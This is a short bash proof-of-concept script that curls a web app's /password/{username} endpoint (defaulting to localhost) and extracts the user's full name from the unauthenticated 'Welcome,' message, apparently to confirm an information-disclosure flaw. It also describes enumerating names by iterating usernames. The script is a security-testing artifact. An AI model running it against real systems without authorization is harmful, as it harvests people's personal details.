#!/bin/bash

# POC: User Full Name Disclosure on Password Page
# Description: Demonstrates that the /password/{username} endpoint discloses 
# user full names in plain text without authentication

TARGET="${1:-http://localhost:8080}"
USERNAME="${2:-test}"

echo "[*] Testing Full Name Disclosure on Password Page"
echo "[*] Target: $TARGET"
echo "[*] Username: $USERNAME"
echo ""

# Access the password page for the given username
RESPONSE=$(curl -s "$TARGET/password/$USERNAME")

# Check if the response contains a welcome message with the user's full name
if echo "$RESPONSE" | grep -q "Welcome,"; then
    echo "[+] VULNERABILITY CONFIRMED: Full name disclosure detected!"
    echo ""
    echo "[+] Extracted welcome message:"
    echo "$RESPONSE" | grep -oP '(?<=<p class="mt-3 text-center">)Welcome, [^<]+' || echo "$RESPONSE" | grep -oP 'Welcome, [^<]+'
    echo ""
    
    # Extract the full name from the welcome message
    FULL_NAME=$(echo "$RESPONSE" | grep -oP 'Welcome, \K[^!<]+' | head -1)
    
    if [ -n "$FULL_NAME" ]; then
        echo "[+] Disclosed Full Name: $FULL_NAME"
        echo "[+] Username: $USERNAME"
        echo "[+] This information was obtained WITHOUT authentication"
        echo ""
        echo "[!] IMPACT: Attackers can enumerate user full names by iterating usernames"
        exit 0
    fi
else
    echo "[-] Could not find welcome message with full name"
    echo "[*] Response snippet:"
    echo "$RESPONSE" | head -20
    exit 1
fi